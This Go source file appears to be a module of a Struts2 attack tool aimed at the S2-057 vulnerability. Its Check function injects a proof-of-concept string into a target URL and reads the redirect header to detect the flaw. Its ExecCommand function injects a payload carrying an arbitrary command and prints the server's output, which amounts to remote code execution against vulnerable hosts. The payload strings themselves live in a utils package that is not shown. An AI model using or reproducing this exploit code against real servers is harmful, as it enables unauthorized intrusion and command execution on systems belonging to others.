package s057

import (
	"ST2G/cvemod/utils"
	"fmt"
	"github.com/fatih/color"
	"strings"
)


func Check(targetUrl string){
	actionIndex := strings.LastIndexAny(targetUrl,"/")
	targetUrl =targetUrl[:actionIndex]+ utils.POC_s057_check+targetUrl[actionIndex:]
	//_ = utils.GetFunc4Struts2(targetUrl,"","")
	headerLocation := utils.Get302Location(targetUrl)
	if utils.IfContainsStr(headerLocation,"6308") {
		color.Red("*Found Struts2-057！")
	}else {
		fmt.Println("Struts2-057 Not Vulnerable.")
	}
}
func ExecCommand(targetUrl string,command string) {
	actionIndex := strings.LastIndexAny(targetUrl,"/")
	targetUrl =targetUrl[:actionIndex]+ utils.POC_s057_exec(command)+targetUrl[actionIndex:]
	respString := utils.GetFunc4Struts2(targetUrl,"","")
	fmt.Println(respString)
}